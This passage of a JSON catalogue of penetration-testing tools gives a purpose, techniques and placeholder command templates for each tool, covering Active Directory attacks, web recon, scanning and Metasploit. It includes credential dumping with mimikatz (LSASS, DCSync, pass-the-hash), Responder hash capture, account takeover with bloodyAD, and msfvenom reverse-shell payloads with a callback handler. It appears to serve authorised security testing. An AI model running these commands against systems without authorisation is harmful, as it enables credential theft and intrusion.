      "purpose": "Dumps the whole directory — users, groups, computers, policies — over LDAP into HTML, JSON and greppable text with one authenticated bind. The fastest way to get an offline copy of the domain.",
      "phases": ["enumeration"],
      "techniques": ["LDAP enumeration", "domain user/group dumping", "offline directory analysis"],
      "docs": "https://github.com/dirkjanm/ldapdomaindump",
      "templates": [
        {
          "label": "Dump the domain to HTML/JSON/greppable",
          "template": "ldapdomaindump -u '<domain>\\<user>' -p <password> -o <output> ldap://<dc-ip>",
          "note": "Any valid domain account is enough. Read domain_users.html first."
        },
        {
          "label": "Dump over LDAPS",
          "template": "ldapdomaindump -u '<domain>\\<user>' -p <password> -o <output> ldaps://<dc-ip>",
          "note": "Use when plain LDAP binds are refused by channel binding / signing policy."
        },
        {
          "label": "Resolve computer names to addresses",
          "template": "ldapdomaindump -u '<domain>\\<user>' -p <password> -r -o <output> ldap://<dc-ip>",
          "note": "-r adds DNS resolution — useful for building a host list to scan."
        }
      ],
      "flags": [
        {"flag": "-u", "what": "DOMAIN\\\\user"},
        {"flag": "-o", "what": "output directory"},
        {"flag": "-r", "what": "resolve computer hostnames"},
        {"flag": "--no-json / --no-grep", "what": "limit the output formats"}
      ]
    },
    {
      "name": "bloodyAD",
      "category": "network-ad",
      "purpose": "AD privilege-escalation swiss army knife — reads and, crucially, WRITES directory objects, so a BloodHound-discovered ACL edge (GenericAll, WriteDACL, AddMember) can actually be exercised.",
      "phases": ["enumeration", "privesc", "exploitation"],
      "techniques": ["ACL abuse", "group membership manipulation", "password reset", "RBCD", "shadow credentials"],
      "docs": "https://github.com/CravateRouge/bloodyAD",
      "templates": [
        {
          "label": "Read an object's attributes",
          "template": "bloodyAD -u <user> -p <password> -d <domain> --host <dc-ip> get object <spn-user>",
          "note": "Confirms the edge BloodHound claimed before you try to use it."
        },
        {
          "label": "Add yourself to a group (AddMember / GenericAll)",
          "template": "bloodyAD -u <user> -p <password> -d <domain> --host <dc-ip> add groupMember <group> <user>",
          "note": "The most common way to cash in a BloodHound path. Reversible — remove it after."
        },
        {
          "label": "Reset another account's password (ForceChangePassword)",
          "template": "bloodyAD -u <user> -p <password> -d <domain> --host <dc-ip> set password <spn-user> <password>",
          "note": "Destructive to the account's real password — get authorisation before using it."
        },
        {
          "label": "Add a shadow credential (GenericWrite on the target)",
          "template": "bloodyAD -u <user> -p <password> -d <domain> --host <dc-ip> add shadowCredentials <spn-user>",
          "note": "Non-destructive alternative to a password reset — yields a certificate instead."
        }
      ],
      "flags": [
        {"flag": "--host", "what": "domain controller"},
        {"flag": "-k", "what": "Kerberos authentication"},
        {"flag": "add / set / get / remove", "what": "the operation verb"}
      ]
    },
    {
      "name": "powerview",
      "platform": "windows",
      "aliases": ["PowerView.ps1"],
      "category": "network-ad",
      "purpose": "PowerShell domain-enumeration library — the on-host counterpart to BloodHound's collection, letting you ask targeted directory questions from an existing session without dropping a collector.",
      "phases": ["enumeration", "privesc"],
      "techniques": ["domain enumeration", "ACL hunting", "local admin access discovery", "SPN discovery"],
      "docs": "https://powersploit.readthedocs.io/en/latest/Recon/",
      "templates": [
        {
          "label": "Load PowerView into the session",
          "template": ". .\\PowerView.ps1",
          "note": "Dot-sourced so the functions land in the current scope."
        },
        {
          "label": "Find hosts where the current user is local admin",
          "template": "Find-LocalAdminAccess",
          "note": "Directly answers 'where can I move next' — often the fastest pivot."
        },
        {
          "label": "List kerberoastable accounts",
          "template": "Get-DomainUser -SPN | select samaccountname,serviceprincipalname",
          "note": "Same targets Rubeus/GetUserSPNs would roast, without touching Kerberos yet."
        },
        {
          "label": "Hunt interesting ACLs",
          "template": "Find-InterestingDomainAcl -ResolveGUIDs",
          "note": "Surfaces the writeable-object edges that BloodHound draws as escalation paths."
        }
      ],
      "flags": [
        {"flag": "-Identity", "what": "restrict to one object"},
        {"flag": "-Domain", "what": "query a different domain"},
        {"flag": "-ResolveGUIDs", "what": "translate extended-right GUIDs to names"}
      ]
    },
    {
      "name": "responder",
      "aliases": ["Responder.py"],
      "category": "credentials",
      "purpose": "LLMNR/NBT-NS/mDNS poisoner — answers the broadcast name lookups Windows makes when DNS fails, so victims authenticate to you and hand over NetNTLM hashes. The classic no-credential foothold on an internal network.",
      "phases": ["enumeration", "exploitation"],
      "techniques": ["LLMNR/NBT-NS poisoning", "NetNTLM hash capture", "relay staging"],
      "docs": "https://github.com/lgandx/Responder",
      "templates": [
        {
          "label": "Poison and capture hashes",
          "template": "responder -I <interface> -wd",
          "note": "Hashes land in /usr/share/responder/logs. Crack with hashcat -m 5600."
        },
        {
          "label": "Analyse only — listen, poison nothing",
          "template": "responder -I <interface> -A",
          "note": "Passive reconnaissance of what name traffic exists before you interfere with it."
        },
        {
          "label": "Disable SMB/HTTP servers for relaying",
          "template": "responder -I <interface> -wd --lm",
          "note": "Turn SMB and HTTP off in Responder.conf when ntlmrelayx needs those ports."
        }
      ],
      "flags": [
        {"flag": "-I", "what": "interface to listen on"},
        {"flag": "-A", "what": "analyse mode — no poisoning"},
        {"flag": "-w", "what": "WPAD rogue proxy server"},
        {"flag": "-d", "what": "answer NetBIOS domain suffix queries"}
      ]
    },
    {
      "name": "mimikatz",
      "platform": "windows",
      "aliases": ["mimikatz.exe"],
      "category": "credentials",
      "purpose": "Windows credential extraction — reads plaintext passwords, hashes and Kerberos tickets out of LSASS memory, and performs DCSync from an elevated session.",
      "phases": ["privesc", "post-exploitation"],
      "techniques": ["LSASS credential dumping", "pass-the-hash", "pass-the-ticket", "DCSync", "golden ticket"],
      "docs": "https://github.com/gentilkiwi/mimikatz/wiki",
      "templates": [
        {
          "label": "Dump logon credentials from LSASS",
          "template": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
          "note": "Needs SeDebugPrivilege (local admin). Caught by essentially every modern EDR."
        },
        {
          "label": "DCSync one account",
          "template": "mimikatz.exe \"lsadump::dcsync /user:<domain>\\krbtgt\" exit",
          "note": "Requires replication rights. The krbtgt hash is what a golden ticket needs."
        },
        {
          "label": "Pass-the-hash into a new process",
          "template": "sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm-hash> /run:cmd.exe",
          "note": "Spawns a process authenticating as that account, without the plaintext."
        },
        {
          "label": "List cached Kerberos tickets",
          "template": "kerberos::list /export",
          "note": "Exports .kirbi tickets for reuse via pass-the-ticket."
        }
      ],
      "flags": [
        {"flag": "privilege::debug", "what": "acquire SeDebugPrivilege first"},
        {"flag": "sekurlsa::", "what": "LSASS memory module"},
        {"flag": "lsadump::", "what": "SAM/LSA/DCSync module"},
        {"flag": "/ntlm:", "what": "hash to authenticate with"}
      ]
    },
    {
      "name": "arjun",
      "category": "web",
      "purpose": "HTTP parameter discovery — finds query and body parameters an endpoint accepts but never advertises, which is where IDOR, SSRF and mass-assignment bugs usually hide.",
      "phases": ["enumeration", "exploitation"],
      "techniques": ["hidden parameter discovery", "parameter mining", "attack surface expansion"],
      "docs": "https://github.com/s0md3v/Arjun",
      "templates": [
        {
          "label": "Discover GET parameters",
          "template": "arjun -u <url> -oT <output>",
          "note": "Baselines the response first, then bisects a parameter wordlist against it."
        },
        {
          "label": "Discover POST / JSON body parameters",
          "template": "arjun -u <url> -m POST -oT <output>",
          "note": "-m JSON when the endpoint expects a JSON body."
        },
        {
          "label": "Mine a whole list of endpoints",
          "template": "arjun -i <file> -oJ <output>",
          "note": "Feed it the URL list katana/gau produced."
        },
        {
          "label": "Rate-limited run against a fragile target",
          "template": "arjun -u <url> --stable -d <size>",
          "note": "--stable slows down and re-checks; -d is a delay in seconds between requests."
        }
      ],
      "flags": [
        {"flag": "-m", "what": "method: GET, POST, JSON, XML"},
        {"flag": "-w", "what": "custom parameter wordlist"},
        {"flag": "-oT / -oJ", "what": "text / JSON output"},
        {"flag": "--stable", "what": "slower, higher-confidence mode"}
      ]
    },
    {
      "name": "paramspider",
      "category": "web",
      "purpose": "Mines web archives for URLs that carry parameters, giving a parameterised attack surface for a domain without sending the target a single request.",
      "phases": ["recon", "enumeration"],
      "techniques": ["passive parameter discovery", "archive mining", "URL harvesting"],
      "docs": "https://github.com/devanshbatham/ParamSpider",
      "templates": [
        {
          "label": "Mine archived parameterised URLs",
          "template": "paramspider -d <domain>",
          "note": "Passive — it queries archives, not the target."
        },
        {
          "label": "Drop static assets from the results",
          "template": "paramspider -d <domain> --exclude woff,css,js,png,svg,jpg,gif -o <output>",
          "note": "Static files dominate archive data; excluding them leaves the real endpoints."
        },
        {
          "label": "Placeholder-marked output for fuzzing",
          "template": "paramspider -d <domain> -p FUZZ -o <output>",
          "note": "Values replaced with FUZZ so the list drops straight into ffuf or wfuzz."
        }
      ],
      "flags": [
        {"flag": "-d", "what": "domain to mine"},
        {"flag": "--exclude", "what": "extensions to drop"},
        {"flag": "-p", "what": "placeholder to substitute for parameter values"},
        {"flag": "-s", "what": "also fetch subdomain results"}
      ]
    },
    {
      "name": "katana",
      "category": "web",
      "purpose": "Fast crawler with an optional headless browser, so it sees the endpoints a JavaScript-rendered application only exposes at runtime.",
      "phases": ["recon", "enumeration"],
      "techniques": ["web crawling", "JS endpoint extraction", "headless rendering", "sitemap discovery"],
      "docs": "https://github.com/projectdiscovery/katana",
      "templates": [
        {
          "label": "Crawl a target",
          "template": "katana -u <url> -d 3 -jc -o <output>",
          "note": "-jc parses linked JavaScript for endpoints the HTML never references."
        },
        {
          "label": "Headless crawl for a JS-heavy app",
          "template": "katana -u <url> -headless -jc -kf all -o <output>",
          "note": "Slower but finds routes that only exist after the bundle executes."
        },
        {
          "label": "Crawl a host list, staying in scope",
          "template": "katana -list <file> -fs fqdn -o <output>",
          "note": "-fs fqdn keeps the crawl on the same host instead of wandering off-scope."
        },
        {
          "label": "Passive sources only (no requests to the target)",
          "template": "katana -u <url> -ps -o <output>",
          "note": "Pulls from archives/indexes — useful before you are cleared to touch the host."
        }
      ],
      "flags": [
        {"flag": "-d", "what": "crawl depth"},
        {"flag": "-jc", "what": "parse JavaScript for endpoints"},
        {"flag": "-headless", "what": "render with a real browser"},
        {"flag": "-fs", "what": "field scope: dn, rdn, fqdn"},
        {"flag": "-ps", "what": "passive sources only"}
      ]
    },
    {
      "name": "gau",
      "aliases": ["getallurls"],
      "category": "web",
      "purpose": "Pulls every URL known to Wayback, Common Crawl, OTX and URLScan for a domain — historical endpoints that are often still live and rarely still maintained.",
      "phases": ["recon", "enumeration"],
      "techniques": ["archive URL harvesting", "historical endpoint discovery", "passive recon"],
      "docs": "https://github.com/lc/gau",
      "templates": [
        {
          "label": "All known URLs for a domain",
          "template": "gau <domain> | tee <output>",
          "note": "Entirely passive — no traffic reaches the target."
        },
        {
          "label": "Include subdomains, recent results only",
          "template": "gau --subs --from 202301 <domain> | tee <output>",
          "note": "--from trims a decade of dead paths down to plausibly-live ones."
        },
        {
          "label": "Keep only parameterised URLs",
          "template": "gau <domain> | grep '?' | sort -u > <output>",
          "note": "The subset worth fuzzing — everything else is static."
        }
      ],
      "flags": [
        {"flag": "--subs", "what": "include subdomains"},
        {"flag": "--from / --to", "what": "date range, YYYYMM"},
        {"flag": "--blacklist", "what": "extensions to drop"},
        {"flag": "--threads", "what": "concurrency"}
      ]
    },
    {
      "name": "waybackurls",
      "category": "web",
      "purpose": "Fetches every path the Wayback Machine ever recorded for a domain. Narrower than gau, and the standard first passive sweep for forgotten endpoints and old parameters.",
      "phases": ["recon"],
      "techniques": ["archive URL harvesting", "passive recon", "forgotten endpoint discovery"],
      "docs": "https://github.com/tomnomnom/waybackurls",
      "templates": [
        {
          "label": "Archived URLs for a domain",
          "template": "waybackurls <domain> | tee <output>",
          "note": "Passive. Reads stdin too, so it chains after subfinder."
        },
        {
          "label": "Parameterised URLs only",
          "template": "waybackurls <domain> | grep '?' | sort -u > <output>",
          "note": "Feeds arjun, ffuf or a manual review of the parameter surface."
        },
        {
          "label": "Interesting file types",
          "template": "waybackurls <domain> | grep -Ei '\\.(json|xml|sql|bak|config|env)$' | sort -u",
          "note": "Archived backups and configs are a recurring source of leaked secrets."
        }
      ],
      "flags": [
        {"flag": "-dates", "what": "prefix each URL with its capture date"},
        {"flag": "-no-subs", "what": "exclude subdomains"},
        {"flag": "-get-versions", "what": "list every archived version of a URL"}
      ]
    },
    {
      "name": "dirsearch",
      "category": "web",
      "purpose": "Content discovery with sensible defaults — extension expansion, status filtering and recursion built in, so it needs less tuning than a raw fuzzer for a first pass.",
      "phases": ["enumeration"],
      "techniques": ["directory brute force", "file discovery", "backup file discovery"],
      "docs": "https://github.com/maurosoria/dirsearch",
      "templates": [
        {
          "label": "Discovery with extension expansion",
          "template": "dirsearch -u <url> -e php,asp,aspx,jsp,html,txt -x 400,403,404 -o <output>",
          "note": "-e appends each extension to every word; -x drops uninteresting statuses."
        },
        {
          "label": "Custom wordlist, tuned concurrency",
          "template": "dirsearch -u <url> -w <wordlist> -t 50 -o <output>",
          "note": "Drop -t well below 50 on anything rate-limited or fragile."
        },
        {
          "label": "Recursive into discovered directories",
          "template": "dirsearch -u <url> -r --max-recursion-depth 2 -o <output>",
          "note": "Cap the depth — unbounded recursion turns into a denial of service."
        },
        {
          "label": "Hunt backup and config leftovers",
          "template": "dirsearch -u <url> -e bak,old,swp,zip,tar.gz,sql -o <output>",
          "note": "Editor and deploy leftovers next to a known file are a common source of source-code disclosure."
        }
      ],
      "flags": [
        {"flag": "-e", "what": "extensions to append"},
        {"flag": "-x", "what": "exclude status codes"},
        {"flag": "-r", "what": "recurse into found directories"},
        {"flag": "-t", "what": "threads"},
        {"flag": "--exclude-sizes", "what": "filter by response size"}
      ]
    },
    {
      "name": "wafw00f",
      "category": "web",
      "purpose": "Fingerprints which WAF sits in front of an application. Informational, and worth running early: it explains 403s that would otherwise read as 'not vulnerable'.",
      "phases": ["recon", "enumeration"],
      "techniques": ["WAF fingerprinting", "defensive stack identification"],
      "docs": "https://github.com/EnableSecurity/wafw00f",
      "templates": [
        {
          "label": "Fingerprint the WAF",
          "template": "wafw00f <url>",
          "note": "Sends a small number of benign probes and matches the responses."
        },
        {
          "label": "Test every known signature",
          "template": "wafw00f -a <url>",
          "note": "-a keeps going after the first match — some stacks run two WAFs."
        },
        {
          "label": "Check a list of hosts",
          "template": "wafw00f -i <file> -o <output>",
          "note": "Tells you which hosts in scope are actually defended."
        }
      ],
      "flags": [
        {"flag": "-a", "what": "find all matches, not just the first"},
        {"flag": "-i", "what": "input file of URLs"},
        {"flag": "-l", "what": "list the WAFs it can detect"},
        {"flag": "-o", "what": "output file"}
      ]
    },
    {
      "name": "testssl.sh",
      "aliases": ["testssl"],
      "category": "web",
      "purpose": "Thorough TLS assessment — protocols, ciphers, certificate chain and the named TLS vulnerabilities — from a single script with no dependencies to install.",
      "phases": ["enumeration"],
      "techniques": ["TLS configuration review", "cipher enumeration", "certificate inspection", "protocol downgrade checks"],
      "docs": "https://testssl.sh/",
      "templates": [
        {
          "label": "Full assessment",
          "template": "testssl.sh --quiet --color 0 <target>",
          "note": "Accepts host, host:port or a URL. Non-invasive — it negotiates handshakes only."
        },
        {
          "label": "Known TLS vulnerabilities only",
          "template": "testssl.sh -U --sneaky <target>",
          "note": "-U runs the vulnerability battery; --sneaky uses a less obvious user agent."
        },
        {
          "label": "Protocols and ciphers by strength",
          "template": "testssl.sh -p -E <target>",
          "note": "The pair that answers 'is anything weak still enabled'."
        },
        {
          "label": "Machine-readable output",
          "template": "testssl.sh --jsonfile <output> <target>",
          "note": "JSON for diffing across retests or feeding into a report."
        }
      ],
      "flags": [
        {"flag": "-U", "what": "test all vulnerabilities"},
        {"flag": "-p", "what": "protocol support"},
        {"flag": "-E", "what": "ciphers per protocol"},
        {"flag": "--jsonfile", "what": "JSON output"},
        {"flag": "--sneaky", "what": "less conspicuous user agent"}
      ]
    },
    {
      "name": "jwt_tool",
      "aliases": ["jwt-tool", "jwt_tool.py"],
      "category": "web",
      "purpose": "JWT analysis and attack toolkit — decodes a token, then tests the signature-handling flaws (alg confusion, alg:none, weak HMAC secrets, kid injection) that turn a token into an authentication bypass.",
      "phases": ["enumeration", "exploitation", "privesc"],
      "techniques": ["JWT decoding", "algorithm confusion", "alg:none bypass", "HMAC secret cracking", "kid injection"],
      "docs": "https://github.com/ticarpi/jwt_tool",
      "templates": [
        {
          "label": "Decode and inspect a token",
          "template": "jwt_tool <token>",
          "note": "Always the first step — the header's alg and kid decide which attacks apply."
        },
        {
          "label": "Run the full attack playbook against a live endpoint",
          "template": "jwt_tool -t <url> -rc 'jwt=<token>' -M at",
          "note": "-M at runs all tests and reports which the server accepted."
        },
        {
          "label": "Crack a weak HMAC secret",
          "template": "jwt_tool <token> -C -d <wordlist>",
          "note": "Entirely offline. A cracked secret means you can mint arbitrary tokens."
        },
        {
          "label": "Forge with alg:none",
          "template": "jwt_tool <token> -X a",
          "note": "-X a strips the signature; -X k is key confusion, -X i is kid injection."
        }
      ],
      "flags": [
        {"flag": "-M", "what": "scan mode: pb (playbook), at (all tests)"},
        {"flag": "-C -d", "what": "crack the secret with a dictionary"},
        {"flag": "-X", "what": "exploit: a=alg:none, k=key confusion, i=kid injection"},
        {"flag": "-T", "what": "interactive tampering"}
      ]
    },
    {
      "name": "wfuzz",
      "category": "web",
      "purpose": "General-purpose HTTP fuzzer built around response filtering — its strength is subtractive: baseline the noise, hide it, and whatever remains is the anomaly.",
      "phases": ["enumeration", "exploitation"],
      "techniques": ["directory fuzzing", "parameter value fuzzing", "vhost discovery", "response-difference analysis"],
      "docs": "https://wfuzz.readthedocs.io/",
      "templates": [
        {
          "label": "Directory fuzz",
          "template": "wfuzz -c -z file,<wordlist> --hc 404 <url>/FUZZ",
          "note": "FUZZ marks the injection point; --hc hides a status code."
        },
        {
          "label": "Parameter value fuzz with a baseline filter",
          "template": "wfuzz -c -z file,<wordlist> --hh <size> <url>?<param>=FUZZ",
          "note": "--hh hides the common response length so only the different one shows."
        },
        {
          "label": "Virtual host discovery",
          "template": "wfuzz -c -z file,<wordlist> -H 'Host: FUZZ.<domain>' --hw <size> <url>",
          "note": "Finds name-based vhosts the default site never links to."
        },
        {
          "label": "Authenticated fuzzing with a rate limit",
          "template": "wfuzz -c -z file,<wordlist> -b 'session=<token>' -s 1 --hc 404 <url>/FUZZ",
          "note": "-b sends a cookie; -s adds a delay between requests."
        }
      ],
      "flags": [
        {"flag": "-z", "what": "payload source (file, range, list)"},
        {"flag": "--hc / --hl / --hw / --hh", "what": "hide by code / lines / words / chars"},
        {"flag": "-H", "what": "custom header"},
        {"flag": "-b", "what": "cookie"},
        {"flag": "-s", "what": "delay between requests"}
      ]
    },
    {
      "name": "hakrawler",
      "category": "web",
      "purpose": "Minimal, fast crawler for endpoints, JS files and subdomains — deliberately unix-y, so it slots into a pipeline between host discovery and parameter mining.",
      "phases": ["recon", "enumeration"],
      "techniques": ["web crawling", "JS discovery", "endpoint harvesting"],
      "docs": "https://github.com/hakluke/hakrawler",
      "templates": [
        {
          "label": "Crawl a URL",
          "template": "echo <url> | hakrawler -d 2 -u",
          "note": "Reads targets on stdin; -u deduplicates."
        },
        {
          "label": "Deeper crawl including subdomains",
          "template": "echo <url> | hakrawler -d 3 -subs -u | tee <output>",
          "note": "-subs follows links onto sibling subdomains — check scope before using it."
        },
        {
          "label": "With an authenticated session",
          "template": "echo <url> | hakrawler -h 'Cookie: session=<token>' -d 2 -u",
          "note": "Authenticated crawls usually reveal several times more surface."
        }
      ],
      "flags": [
        {"flag": "-d", "what": "crawl depth"},
        {"flag": "-subs", "what": "include subdomains"},
        {"flag": "-u", "what": "unique results only"},
        {"flag": "-h", "what": "custom header"}
      ]
    },
    {
      "name": "sslscan",
      "category": "web",
      "purpose": "Quick cipher and protocol enumeration for a TLS service — narrower and much faster than testssl.sh, which makes it the right tool when sweeping many hosts.",
      "phases": ["enumeration"],
      "techniques": ["cipher enumeration", "protocol support checks", "certificate inspection"],
      "docs": "https://github.com/rbsec/sslscan",
      "templates": [
        {
          "label": "Enumerate ciphers and protocols",
          "template": "sslscan <target>",
          "note": "Colour-codes weak ciphers. Add :port for a non-443 service."
        },
        {
          "label": "Certificate detail only",
          "template": "sslscan --show-certificate --no-ciphersuites <target>",
          "note": "Certificate SANs frequently name internal hosts worth adding to scope."
        },
        {
          "label": "STARTTLS on a mail service",
          "template": "sslscan --starttls-smtp <target>",
          "note": "Also --starttls-imap, --starttls-pop3, --starttls-ftp."
        }
      ],
      "flags": [
        {"flag": "--show-certificate", "what": "print certificate details"},
        {"flag": "--no-ciphersuites", "what": "skip cipher enumeration"},
        {"flag": "--starttls-*", "what": "negotiate STARTTLS for that protocol"},
        {"flag": "--targets", "what": "file of hosts"}
      ]
    },
    {
      "name": "rustscan",
      "category": "recon",
      "purpose": "Very fast port sweep that hands its findings straight to nmap for service detection — the practical answer to 'nmap -p- takes too long'.",
      "phases": ["recon"],
      "techniques": ["fast port scanning", "nmap hand-off", "adaptive scan rate"],
      "docs": "https://github.com/bee-san/RustScan",
      "templates": [
        {
          "label": "Full sweep, then nmap on what it found",
          "template": "rustscan -a <target> --ulimit 5000 -- -sCV -oA <output>",
          "note": "Everything after -- is passed to nmap, against only the open ports."
        },
        {
          "label": "Specific port range",
          "template": "rustscan -a <target> -r <ports> --ulimit 5000",
          "note": "Use when a full sweep is too loud or too slow for the window."
        },
        {
          "label": "Gentler batch size for a fragile host",
          "template": "rustscan -a <target> -b 500 --ulimit 5000 -- -sCV",
          "note": "The default rate can knock over embedded or heavily-filtered targets."
        }
      ],
      "flags": [
        {"flag": "-a", "what": "address(es) to scan"},
        {"flag": "--ulimit", "what": "raise the file-descriptor limit (needed for speed)"},
        {"flag": "-b", "what": "batch size — lower is gentler"},
        {"flag": "-r", "what": "port range"},
        {"flag": "--", "what": "pass the rest to nmap"}
      ]
    },
    {
      "name": "naabu",
      "category": "recon",
      "purpose": "SYN/CONNECT port scanner built for pipelines — fast, quiet by default and designed to feed httpx or nuclei directly.",
      "phases": ["recon"],
      "techniques": ["port scanning", "host discovery", "pipeline scanning"],
      "docs": "https://github.com/projectdiscovery/naabu",
      "templates": [
        {
          "label": "Top ports on a host",
          "template": "naabu -host <target> -top-ports 1000 -o <output>",
          "note": "SYN scan needs root; it falls back to CONNECT without it."
        },
        {
          "label": "Full sweep piped into httpx",
          "template": "naabu -host <target> -p - -silent | httpx -silent -o <output>",
          "note": "Ports straight to live-HTTP detection in one pass."
        },
        {
          "label": "Scan a host list with a rate cap",
          "template": "naabu -list <file> -top-ports 100 -rate 500 -o <output>",
          "note": "-rate is the packets/sec ceiling — the knob for staying under IDS thresholds."
        },
        {
          "label": "Hand off to nmap for service detection",
          "template": "naabu -host <target> -p - -nmap-cli 'nmap -sCV' -o <output>",
          "note": "Same two-phase pattern as rustscan."
        }
      ],
      "flags": [
        {"flag": "-top-ports", "what": "scan the N most common ports"},
        {"flag": "-p -", "what": "all 65535 ports"},
        {"flag": "-rate", "what": "packets per second cap"},
        {"flag": "-nmap-cli", "what": "nmap command to run on the results"}
      ]
    },
    {
      "name": "dnsrecon",
      "category": "recon",
      "purpose": "Broad DNS enumeration — standard records, subdomain brute force, reverse lookups, cache snooping and zone transfers in one tool.",
      "phases": ["recon"],
      "techniques": ["DNS enumeration", "zone transfer", "subdomain brute force", "reverse DNS sweep", "SRV record discovery"],
      "docs": "https://github.com/darkoperator/dnsrecon",
      "templates": [
        {
          "label": "Standard record enumeration",
          "template": "dnsrecon -d <domain>",
          "note": "SOA, NS, MX, A, TXT and SRV — the free information before anything noisy."
        },
        {
          "label": "Attempt a zone transfer",
          "template": "dnsrecon -d <domain> -t axfr",
          "note": "Rarely works, and hands over the entire zone when it does. Always worth one try."
        },
        {
          "label": "Brute-force subdomains",
          "template": "dnsrecon -d <domain> -D <wordlist> -t brt",
          "note": "Catches names that no certificate log or archive ever recorded."
        },
        {
          "label": "SRV records — locate AD services",
          "template": "dnsrecon -d <domain> -t srv",
          "note": "In an AD environment this names the domain controllers directly."
        }
      ],
      "flags": [
        {"flag": "-t", "what": "type: std, axfr, brt, srv, rvl, snoop"},
        {"flag": "-D", "what": "subdomain wordlist"},
        {"flag": "-n", "what": "specific nameserver to query"},
        {"flag": "--json", "what": "JSON output"}
      ]
    },
    {
      "name": "shodan",
      "category": "recon",
      "purpose": "Queries Shodan's existing internet-wide scan index. Entirely passive — it reports what Shodan already saw, so the target receives no traffic from you at all.",
      "phases": ["recon"],
      "techniques": ["passive service discovery", "banner intelligence", "historical port data", "exposure discovery"],
      "docs": "https://cli.shodan.io/",
      "templates": [
        {
          "label": "One-time API key setup",
          "template": "shodan init <api-key>",
          "note": "Stored locally; needed once before any other subcommand."
        },
        {
          "label": "What Shodan already knows about a host",
          "template": "shodan host <target>",
          "note": "Open ports, banners and history without sending the target a packet."
        },
        {
          "label": "Search the index",
          "template": "shodan search --fields ip_str,port,org '<query>'",
          "note": "Query syntax supports org:, ssl:, http.title:, product: filters."
        },
        {
          "label": "All indexed hosts under a domain",
          "template": "shodan domain <domain>",
          "note": "Subdomains plus the ports Shodan last saw open on each."
        }
      ],
      "flags": [
        {"flag": "host", "what": "look up one address"},
        {"flag": "search", "what": "query the index"},
        {"flag": "--fields", "what": "columns to print"},
        {"flag": "domain", "what": "domain-wide view"}
      ]
    },
    {
      "name": "fierce",
      "category": "recon",
      "purpose": "DNS reconnaissance that also walks the address ranges around what it finds — good at locating the non-contiguous netblocks an organisation actually uses.",
      "phases": ["recon"],
      "techniques": ["DNS enumeration", "subdomain brute force", "adjacent netblock discovery", "zone transfer"],
      "docs": "https://github.com/mschwager/fierce",
      "templates": [
        {
          "label": "Enumerate a domain",
          "template": "fierce --domain <domain>",
          "note": "Tries a zone transfer first, then brute-forces, then scans nearby addresses."
        },
        {
          "label": "With a custom subdomain wordlist",
          "template": "fierce --domain <domain> --subdomain-file <wordlist>",
          "note": "The default list is small — a targeted one finds considerably more."
        },
        {
          "label": "Widen the adjacent-address sweep",
          "template": "fierce --domain <domain> --traverse 10",
          "note": "Checks N addresses either side of each hit for related hosts."
        }
      ],
      "flags": [
        {"flag": "--domain", "what": "domain to enumerate"},
        {"flag": "--subdomain-file", "what": "wordlist"},
        {"flag": "--traverse", "what": "how far to walk around each found address"},
        {"flag": "--dns-servers", "what": "resolvers to use"}
      ]
    },
    {
      "name": "msfconsole",
      "aliases": ["metasploit", "msf"],
      "category": "exploitation",
      "purpose": "The Metasploit console — a large library of exploit, auxiliary and post modules with a common interface for configuring, checking and running them.",
      "phases": ["exploitation", "post-exploitation"],
      "techniques": ["exploit module execution", "auxiliary scanning", "payload handling", "post-exploitation modules"],
      "docs": "https://docs.metasploit.com/",
      "templates": [
        {
          "label": "Search for a module",
          "template": "msfconsole -q -x 'search <query>; exit'",
          "note": "-q quiet, -x runs commands non-interactively. Search by CVE, product or name."
        },
        {
          "label": "Check exploitability WITHOUT exploiting",
          "template": "msfconsole -q -x 'use <module>; set RHOSTS <target>; check; exit'",
          "note": "Many modules support check — confirm before firing anything."
        },
        {
          "label": "Run a module against the target",
          "template": "msfconsole -q -x 'use <module>; set RHOSTS <target>; set LPORT <listener-port>; run; exit'",
          "note": "Read the module's options and description first; some are destructive."
        },
        {
          "label": "Handler for an incoming callback",
          "template": "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD <payload>; set LHOST <listener>; set LPORT <listener-port>; run'",
          "note": "LHOST is YOUR address, not the target's — it is where the shell connects back to."
        }
      ],
      "flags": [
        {"flag": "-q", "what": "no banner"},
        {"flag": "-x", "what": "run these console commands"},
        {"flag": "-r", "what": "run a resource script"},
        {"flag": "set RHOSTS", "what": "the target"},
        {"flag": "set LHOST", "what": "your callback address"}
      ]
    },
    {
      "name": "msfvenom",
      "category": "exploitation",
      "purpose": "Metasploit's standalone payload generator — builds a shell or agent for a given platform and output format, with optional encoding and bad-character avoidance.",
      "phases": ["exploitation"],
      "techniques": ["payload generation", "shellcode generation", "format conversion", "bad character avoidance"],
      "docs": "https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html",
      "templates": [
        {
          "label": "Windows reverse TCP executable",
          "template": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<listener> LPORT=<listener-port> -f exe -o <output>",
          "note": "LHOST is your callback address. Pair with a multi/handler before delivering it."
        },
        {
          "label": "Linux ELF reverse shell",
          "template": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<listener> LPORT=<listener-port> -f elf -o <output>",
          "note": "Staged (meterpreter) vs stageless (shell_reverse_tcp) matters when egress is filtered."
        },
        {
          "label": "Web payload for an upload or deploy path",
          "template": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<listener> LPORT=<listener-port> -f war -o <output>",
          "note": "Also php/meterpreter/reverse_tcp -f raw, or windows/.../reverse_tcp -f aspx."
        },
        {
          "label": "Raw shellcode avoiding bad characters",
          "template": "msfvenom -p <payload> LHOST=<listener> LPORT=<listener-port> -f c -b '\\x00\\x0a\\x0d' -o <output>",
          "note": "-b excludes bytes the vulnerable parser would truncate on."
        },
        {
          "label": "List available payloads",
          "template": "msfvenom --list payloads | grep <pattern>",
          "note": "Purely informational — generates nothing."
        }
      ],
      "flags": [
        {"flag": "-p", "what": "payload"},
        {"flag": "-f", "what": "output format (exe, elf, raw, war, aspx, c, py)"},
        {"flag": "-b", "what": "bad characters to avoid"},
        {"flag": "-e", "what": "encoder"},
        {"flag": "-o", "what": "output file"}
      ]
    },
    {
      "name": "searchsploit",
      "aliases": ["exploitdb"],
      "category": "exploitation",
      "purpose": "Offline search over the Exploit-DB archive — maps a product and version from your service enumeration to public exploit code already on disk.",
      "phases": ["enumeration", "exploitation"],
      "techniques": ["public exploit lookup", "version-to-exploit mapping", "offline exploit archive search"],
      "docs": "https://www.exploit-db.com/searchsploit",
      "templates": [
        {
